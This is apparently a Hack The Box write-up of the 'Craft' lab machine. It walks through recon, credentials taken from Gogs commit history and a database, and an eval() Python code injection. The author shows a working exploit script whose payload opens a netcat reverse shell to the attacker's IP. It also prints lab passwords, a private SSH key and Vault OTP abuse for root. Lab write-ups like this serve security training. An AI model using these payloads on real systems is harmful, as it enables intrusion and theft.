---
title: "HTB-Craft"
related: false
categories:
  - Layout
  - Uncategorized
tags:
  - related posts
  - layout
img: assets/images/craft/banner.png
---

# Box Overview



- Craft Was a nice realistic box That involved Analyzing code that being hosted on Gogs to find missing credentials and a Python Code Injection.
- First shell inside a docker sadly I didn't see the right thing fast and got drowned in some rabbit holes but got out of them eventually.
- Finding creds in Database and taking a step back to go again for Gogs and find a SSH Private key and then logging in as Gilfoyle.
- Inside Gilfoyle directory There is a Vault Token that is used to authenticate to [Vault](https://www.vaultproject.io/) software.
- Gilfoyle was using Vault to generate OTP for root SSH.
- By finding the OTP rule name from Gilfoyle repository I generated an OTP for root SSH and logged in as root.

# Recon



## nmap



There is 3 ports open 22(SSH), 443(Web), 6022(SSH)

    # Nmap 7.80 scan as: nmap -sT -p- -vv -n -Pn --min-rate 10000 -oN nmap/alltcp 10.10.10.110
    Nmap scan report for 10.10.10.110
    Host is up, received user-set (0.10s latency).
    Scanned at 2020-01-03 20:18:07 EET for 41s
    Not shown: 56264 closed ports, 9268 filtered ports
    Reason: 56264 conn-refused and 9268 no-responses
    PORT     STATE SERVICE REASON
    22/tcp   open  ssh     syn-ack
    443/tcp  open  https   syn-ack
    6022/tcp open  x11     syn-ack

    Read data files from: /usr/bin/../share/nmap
    # Nmap done -- 1 IP address (1 host up) scanned in 40.93 seconds

    # Nmap 7.80 scan as: nmap -sC -sV -Pn -p 22,443,6022 -oN nmap/scripts 10.10.10.110
    Nmap scan report for 10.10.10.110
    Host is up (0.10s latency).

    PORT     STATE SERVICE  VERSION
    22/tcp   open  ssh      OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0)
    | ssh-hostkey:
    |   2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)
    |   256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)
    |_  256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)
    443/tcp  open  ssl/http nginx 1.15.8
    |_http-server-header: nginx/1.15.8
    |_http-title: About
    | ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US
    | Not valid before: 2019-02-06T02:25:47
    |_Not valid after:  2020-06-20T02:25:47
    |_ssl-date: TLS randomness does not represent time
    | tls-alpn:
    |_  http/1.1
    | tls-nextprotoneg:
    |_  http/1.1
    6022/tcp open  ssh      (protocol 2.0)
    | fingerprint-strings:
    |   NULL:
    |_    SSH-2.0-Go
    | ssh-hostkey:
    |_  2048 5b:cc:bf:f1:a1:8f:72:b0:c0:fb:df:a3:01:dc:a6:fb (RSA)
    1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
    SF-Port6022-TCP:V=7.80%I=7%D=1/3%Time=5E0F85A3%P=x86_64-pc-linux-gnu%r(NUL
    SF:L,C,"SSH-2\.0-Go\r\n");
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    # Nmap done -- 1 IP address (1 host up) scanned in 54.50 seconds

## Web



## SSL Certificate

From SSL certificate we can find a hostname and an email

    root@kali:# curl -v https://craft.htb -k
    * Server certificate:
    *  subject: C=US; ST=NY; O=Craft; CN=craft.htb
    *  start date: Feb  6 02:25:47 2019 GMT
    *  expire date: Jun 20 02:25:47 2020 GMT
    *  issuer: C=US; ST=New York; L=Buffalo; O=Craft; OU=Craft; CN=Craft CA; emailAddress=admin@craft.htb
    *  SSL certificate verify result: unable to get local issuer certificate (20), continuing anyway.

### Main



Web had two links to two subdomain **api.craft.htb** and **gogs.craft.htb**

![Craft/Untitled.png](/assets/images/Craft/Untitled.png)

### API



Nothing interesting was here!

![Craft/Untitled%201.png](/assets/images/Craft/Untitled%201.png)

Every time I tried to do anything **API** responded

    {
      "message": "Invalid token or no token found."
    }

### Gogs



On Gogs I found a repository **craft-api**.

First look I found an issue that has been opened about a parameter **abv** that value needs to be checked before submitting to the database.

![Craft/Untitled%202.png](/assets/images/Craft/Untitled%202.png)

Looking at that commit and analyzing the source code before and after the developer fixed it.

Before

It would accept any value and pass it to **create_brew()**.

    def post(self):
            """
            Creates a new brew entry.
            """

            create_brew(request.json)
            return None, 201

After and live version!

Now the value gets passed first to **eval()** to evaluate the value first.

    def post(self):
            """
            Creates a new brew entry.
            """

            # make sure the ABV value is sane.
            if eval('%s > 1' % request.json['abv']):
                return "ABV must be a decimal value less than 1.0", 400
            else:
                create_brew(request.json)
                return None, 201

That's a **python code injection** vulnerability. I can pass values to **eval()** through **ABV**.

In latest commit, I found a script **test.py** that checks if **abv** issue has been solved or not.

    #!/usr/bin/env python

    import requests
    import json

    response = requests.get('https://api.craft.htb/api/auth/login',  auth=('', ''), verify=False)
    json_response = json.loads(response.text)
    token =  json_response['token']

    headers = { 'X-Craft-API-Token': token, 'Content-Type': 'application/json'  }

    # make sure token is valid
    response = requests.get('https://api.craft.htb/api/auth/check', headers=headers, verify=False)
    print(response.text)

    # create a sample brew with bogus ABV... should fail.

    print("Create bogus ABV brew")
    brew_dict = {}
    brew_dict['abv'] = '15.0'
    brew_dict['name'] = 'bullshit'
    brew_dict['brewer'] = 'bullshit'
    brew_dict['style'] = 'bullshit'

    json_data = json.dumps(brew_dict)
    response = requests.post('https://api.craft.htb/api/brew/', headers=headers, data=json_data, verify=False)
    print(response.text)


    # create a sample brew with real ABV... should succeed.
    print("Create real ABV brew")
    brew_dict = {}
    brew_dict['abv'] = '0.15'
    brew_dict['name'] = 'bullshit'
    brew_dict['brewer'] = 'bullshit'
    brew_dict['style'] = 'bullshit'

    json_data = json.dumps(brew_dict)
    response = requests.post('https://api.craft.htb/api/brew/', headers=headers, data=json_data, verify=False)
    print(response.text)

Looking at older commits of the same file I found it had creds and has been deleted in newer one.

    dinesh:4aUh0A8PbVJxgd

I logged in to Gogs with those creds as Dinesh but there was nothing new to what is already been public.

# Exploitation



So, Right now I will exploit that **python code injection** vulnerability to get a reverse shell.

## Shell in a Docker



So, I'll use **test.py** and edit it a little bit.

    #!/usr/bin/env python3
    import requests
    import json
    import sys

    if (len(sys.argv) < 2):
        print(f"Usage: {sys.argv[0]} IP PORT")
        sys.exit()

    ip = sys.argv[1]
    port = sys.argv[2]

    response = requests.get('https://api.craft.htb/api/auth/login',  auth=('dinesh', '4aUh0A8PbVJxgd'), verify=False)
    json_response = json.loads(response.text)
    token =  json_response['token']

    headers = { 'X-Craft-API-Token': token, 'Content-Type': 'application/json'  }
    # The payload i am sending to Eval is just executing a reverse shell inside os.system
    payload = f'__import__("os").system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f")'
    brew_dict = {}
    brew_dict['abv'] = payload
    brew_dict['name'] = 'bullshit'
    brew_dict['brewer'] = 'bullshit'
    brew_dict['style'] = 'bullshit'

    json_data = json.dumps(brew_dict)
    response = requests.post('https://api.craft.htb/api/brew/', headers=headers, data=json_data, verify=False)
    print(response.text)

Running it

    root@kali:# python3 craft-api-exploit.py
    Usage: craft-api-exploit.py IP PORT
    root@kali:# python3 craft-api-exploit.py 10.10.15.38 9001


And I got my shell back

    root@kali:# nc -lvnp 9001
    Ncat: Version 7.80 ( https://nmap.org/ncat )
    Ncat: Listening on :::9001
    Ncat: Listening on 0.0.0.0:9001
    Ncat: Connection from 10.10.10.110.
    Ncat: Connection from 10.10.10.110:43437.
    /bin/sh: can't access tty; job control turned off
    /opt/app #

By doing hostname I can see that we are in a docker.

    /opt/app# hostname
    5a3d243127f5

## Gilfoyle Repo



After some time in the docker trying to enumerate the network, maybe I can pivot to the real box. wasted some time in that and some other rabbit holes.

There was **dbtest.py** script in the repository testing connection to a database. Database wasn't on the same docker I am on and there was no MySQL installed so I had to enumerate the database with that python script.

    #!/usr/bin/env python
    import pymysql
    from craft_api import settings

    # test connection to mysql database

    connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,
                                 user=settings.MYSQL_DATABASE_USER,
                                 password=settings.MYSQL_DATABASE_PASSWORD,
                                 db=settings.MYSQL_DATABASE_DB,
                                 cursorclass=pymysql.cursors.DictCursor)

    try:
        with connection.cursor() as cursor:
            sql = "SELECT `id`, `brewer`, `name`, `abv` FROM `brew` LIMIT 1"
            cursor.execute(sql)
            result = cursor.fetchone()
            print(result)

    finally:
        connection.close()

I have got the values from the database connection string by printing them but they weren't needed

    craft:qLGockJ6G2J75O

Database was on another docker

    /opt/app # ping -c 1 db
    PING db (172.20.0.4): 56 data bytes
    64 bytes from 172.20.0.4: seq=0 ttl=64 time=0.135 ms

    --- db ping statistics ---
    1 packets transmitted, 1 packets received, 0% packet loss
    round-trip min/avg/max = 0.135/0.135/0.135 ms

With no TTY its almost impossible to open Vi and edit a text so I will edit dbtest.py on my kali to take argument as SQL query.

I could had made a proxy and connected to that host with my kali but that is not necessary and with little coding can be skipped.

I've wasted some time thanks to **fetchone()** that only fetches the first row the database sends.

I changed it to **fetchall()**.

    #!/usr/bin/env python
    import pymysql
    from craft_api import settings
    import sys

    # test connection to mysql database

    connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,
                                 user=settings.MYSQL_DATABASE_USER,
                                 password=settings.MYSQL_DATABASE_PASSWORD,
                                 db=settings.MYSQL_DATABASE_DB,
                                 cursorclass=pymysql.cursors.DictCursor)


    try:
        with connection.cursor() as cursor:
            sql = sys.argv[1] # Argument to take SQL Query
            cursor.execute(sql)
            result = cursor.fetchall() # Instead of fetchone()
            print(result)

    finally:
        connection.close()

Those the databases i found

    /opt/app # ./dbtest.py 'show databases;'
    [{'Database': 'craft'}, {'Database': 'information_schema'}]

Tables in craft database

    /opt/app # ./dbtest.py 'show tables;'
    [{'Tables_in_craft': 'brew'}, {'Tables_in_craft': 'user'}]

Fetching all data from user table

    /opt/app # ./dbtest.py 'select * from craft.user;'
    [{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}, {'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}, {'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}]

    ebachman:llJ77D8QFkLPQB
    gilfoyle:ZEU3N8WNM2rh4T

Nice, That's another creds for Gogs.

Gilfoyle creds worked and we did log in to his Gogs account.

## Shell as Gilfoyle



Every pair of creds I find I always try to SSH with. all creds I've found non of them worked for SSH on both ports.

So, After logging in with Gilfoyle on Gogs I found a privet repository **craft-infra**.

The first directory took my eyes was **.ssh** directory that contained a privet SSH key

    -----BEGIN OPENSSH PRIVATE KEY-----
    b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDD9Lalqe
    qF/F3X76qfIGkIAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQDSkCF7NV2Z
    F6z8bm8RaFegvW2v58stknmJK9oS54ZdUzH2jgD0bYauVqZ5DiURFxIwOcbVK+jB39uqrS
    zU0aDPlyNnUuUZh1Xdd6rcTDE3VU16roO918VJCN+tIEf33pu2VtShZXDrhGxpptcH/tfS
    RgV86HoLpQ0sojfGyIn+4sCg2EEXYng2JYxD+C1o4jnBbpiedGuqeDSmpunWA82vwWX4xx
    lLNZ/ZNgCQTlvPMgFbxCAdCTyHzyE7KI+0Zj7qFUeRhEgUN7RMmb3JKEnaqptW4tqNYmVw
    pmMxHTQYXn5RN49YJQlaFOZtkEndaSeLz2dEA96EpS5OJl0jzUThAAAD0JwMkipfNFbsLQ
    B4TyyZ/M/uERDtndIOKO+nTxR1+eQkudpQ/ZVTBgDJb/z3M2uLomCEmnfylc6fGURidrZi
    4u+fwUG0Sbp9CWa8fdvU1foSkwPx3oP5YzS4S+m/w8GPCfNQcyCaKMHZVfVsys9+mLJMAq
    Rz5HY6owSmyB7BJrRq0h1pywue64taF/FP4sThxknJuAE+8BXDaEgjEZ+5RA5Cp4fLobyZ
    3MtOdhGiPxFvnMoWwJLtqmu4hbNvnI0c4m9fcmCO8XJXFYz3o21Jt+FbNtjfnrIwlOLN6K
    Uu/17IL1vTlnXpRzPHieS5eEPWFPJmGDQ7eP+gs/PiRofbPPDWhSSLt8BWQ0dzS8jKhGmV
    ePeugsx/vjYPt9KVNAN0XQEA4tF8yoijS7M8HAR97UQHX/qjbna2hKiQBgfCCy5GnTSnBU
    GfmVxnsgZAyPhWmJJe3pAIy+OCNwQDFo0vQ8kET1I0Q8DNyxEcwi0N2F5FAE0gmUdsO+J5
    0CxC7XoOzvtIMRibis/t/jxsck4wLumYkW7Hbzt1W0VHQA2fnI6t7HGeJ2LkQUce/MiY2F
    5TA8NFxd+RM2SotncL5mt2DNoB1eQYCYqb+fzD4mPPUEhsqYUzIl8r8XXdc5bpz2wtwPTE
    cVARG063kQlbEPaJnUPl8UG2oX9LCLU9ZgaoHVP7k6lmvK2Y9wwRwgRrCrfLREG56OrXS5
    elqzID2oz1oP1f+PJxeberaXsDGqAPYtPo4RHS0QAa7oybk6Y/ZcGih0ChrESAex7wRVnf
    CuSlT+bniz2Q8YVoWkPKnRHkQmPOVNYqToxIRejM7o3/y9Av91CwLsZu2XAqElTpY4TtZa
    hRDQnwuWSyl64tJTTxiycSzFdD7puSUK48FlwNOmzF/eROaSSh5oE4REnFdhZcE4TLpZTB
    a7RfsBrGxpp++Gq48o6meLtKsJQQeZlkLdXwj2gOfPtqG2M4gWNzQ4u2awRP5t9AhGJbNg
    MIxQ0KLO+nvwAzgxFPSFVYBGcWRR3oH6ZSf+iIzPR4lQw9OsKMLKQilpxC6nSVUPoopU0W
    Uhn1zhbr+5w5eWcGXfna3QQe3zEHuF3LA5s0W+Ql3nLDpg0oNxnK7nDj2I6T7/qCzYTZnS
    Z3a9/84eLlb+EeQ9tfRhMCfypM7f7fyzH7FpF2ztY+j/1mjCbrWiax1iXjCkyhJuaX5BRW
    I2mtcTYb1RbYd9dDe8eE1X+C/7SLRub3qdqt1B0AgyVG/jPZYf/spUKlu91HFktKxTCmHz
    6YvpJhnN2SfJC/QftzqZK2MndJrmQ=
    -----END OPENSSH PRIVATE KEY-----

I immediately tried it on SSH as Gilfoyle

    root@kali:# ssh -i gilfoyle.pem gilfoyle@craft.htb
    The authenticity of host 'craft.htb (10.10.10.110)' can't be established.
    ECDSA key fingerprint is SHA256:sFjoHo6ersU0f0BTzabUkFYHOr6hBzWsSK0MK5dwYAw.
    Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
    Warning: Permanently added 'craft.htb,10.10.10.110' (ECDSA) to the list of known hosts.


      .   *   ..  . *  *
    *  * @()Ooc()*   o  .
        (Q@*0CG*O()  ___
       |\_________/|/ _ \
       |  |  |  |  | / | |
       |  |  |  |  | | | |
       |  |  |  |  | | | |
       |  |  |  |  | | | |
       |  |  |  |  | | | |
       |  |  |  |  | \_| |
       |  |  |  |  |\___/
       |\_|__|__|_/|
        \_________/



    Enter passphrase for key 'gilfoyle.pem':

Private key was encrypted and His Gogs password worked.

I got user.txt now.

    gilfoyle@craft:$ cat user.txt
    bbf4b0...

# Privilege Escalation



Gilfoyle directory had something interesting.

    gilfoyle@craft:$ cat .vault-token
    f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9

After some searching for what **Vault Token** is. I found out about vault.

Vault secures, stores, and tightly controls access to tokens, passwords and things like that. Tokens are the core method for authentication within Vault.

Gilfoyle was using vault and I found vault directory on his repo. and there was secrets.sh

    #!/bin/bash

    # set up vault secrets backend

    vault secrets enable ssh

    vault write ssh/roles/root_otp \
        key_type=otp \
        default_user=root \
        cidr_list=0.0.0.0/0

What I understood from that script that Gilfoyle is using vault to generate OTP for root SSH. I did some searching on that and found [This](https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html)

Create OTP for SSH by the help of the above website and the role from [secrets.sh](http://secrets.sh) (No need to login to vault because token is already in .vault-token file in Gilfoyle directory)

    gilfoyle@craft:~$ vault ssh -role root_otp -mode otp root@127.0.0.1
    Vault could not locate "sshpass". The OTP code for the session is displayed
    below. Enter this code in the SSH password prompt. If you install sshpass,
    Vault can automatically perform this step for you.
    OTP for the session is: 8808cb25-03b3-c207-6d7f-5bafd6ce4b82


      .   *   ..  . *  *
    *  * @()Ooc()*   o  .
        (Q@*0CG*O()  ___
       |\_________/|/ _ \
       |  |  |  |  | / | |
       |  |  |  |  | | | |
       |  |  |  |  | | | |
       |  |  |  |  | | | |
       |  |  |  |  | | | |
       |  |  |  |  | \_| |
       |  |  |  |  |\___/
       |\_|__|__|_/|
        \_________/



    Password:
    Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64

    The programs included with the Debian GNU/Linux system are free software;
    the exact distribution terms for each program are described in the
    individual files in /usr/share/doc/*/copyright.

    Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
    permitted by applicable law.
    Last login: Tue Aug 27 04:53:14 2019
    root@craft:# cat root.txt
    831d6...

**That was Craft Box. Hope you liked it! and Thanks for reading.**
